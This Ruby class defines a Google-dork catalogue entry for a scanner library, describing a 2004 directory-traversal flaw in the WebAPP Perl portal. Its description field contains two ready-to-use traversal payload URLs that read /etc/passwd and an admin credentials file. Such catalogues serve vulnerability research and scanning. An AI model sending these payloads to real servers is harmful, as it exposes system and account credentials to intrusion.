module Dorks
   class Dork463 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 463",
            ghdb_url: "https://www.exploit-db.com/ghdb/463",
            severity: "6",
            category: "advisories_and_vulnerabilities.dir-traversal.webapp",
            publish_date: "2004-09-07",
            author: "anonymous",
            dork: <<~EDORK,
WebAPP directory traversal
EDORK
            description: <<~EDESC
WebAPP is advertised as the internet's most feature rich, easy to run PERL based portal system. The WebAPP system has a serious reverse directory traversal vulnerabilityhttp:///cgi-bin/index.cgi?action=topics&viewcat=../../../../../../../etc/passwd%00http:///cgi-bin/index.cgi?action=topics&viewcat=../../db/members/admin.dat%00Detailed info : http://www.packetstormsecurity.com/0408-exploits/webapp.traversal.txtCredits goes to PhTeam for discovering this vulnerability.
EDESC
         })

      end
   end
end
